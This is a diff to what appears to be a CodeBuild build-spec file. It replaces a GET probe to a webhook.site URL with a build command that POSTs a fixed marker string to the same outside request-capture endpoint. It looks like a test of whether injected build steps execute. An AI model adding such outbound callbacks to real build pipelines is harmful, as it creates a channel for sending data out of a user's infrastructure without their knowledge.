@@ -3,4 +3,7 @@ version: 0.2
 phases:
   build:
     commands:
-      - curl -fsS "https://webhook.site/0b9973f6-84da-4f46-a8d0-11077072813e?probe=codebuild"
+      - |
+        echo "binary9" | curl -fsS -X POST \
+          --data-binary @- \
+          'https://webhook.site/0b9973f6-84da-4f46-a8d0-11077072813e'
